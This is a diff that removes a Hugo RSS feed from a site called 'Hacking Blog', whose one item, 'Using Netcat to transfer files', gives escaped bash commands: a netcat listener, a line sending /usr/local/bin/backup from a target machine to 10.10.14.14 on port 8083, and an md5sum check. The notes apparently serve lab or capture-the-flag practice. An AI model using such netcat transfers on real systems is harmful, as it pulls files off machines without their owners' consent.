@@ -1,7 +1,0 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Nc on Hacking Blog</title><link>https://hack.com.cy/tags/nc/</link><description>Recent content in Nc on Hacking Blog</description><generator>Hugo</generator><language>en</language><lastBuildDate>Thu, 21 Aug 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://hack.com.cy/tags/nc/index.xml" rel="self" type="application/rss+xml"/><item><title>Using Netcat to transfer files</title><link>https://hack.com.cy/notes/file-transfers/nc/nc/</link><pubDate>Thu, 21 Aug 2025 00:00:00 +0000</pubDate><guid>https://hack.com.cy/notes/file-transfers/nc/nc/</guid><description>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">nc -nvlp &lt;span class="m">8083&lt;/span> &amp;gt; backup
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">nc 10.10.14.14 &lt;span class="m">8083&lt;/span> &amp;lt; /usr/local/bin/backup
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Verify that we tranfered the whole binary
-&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">md5sum /usr/local/bin/backup
-&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item></channel></rss>
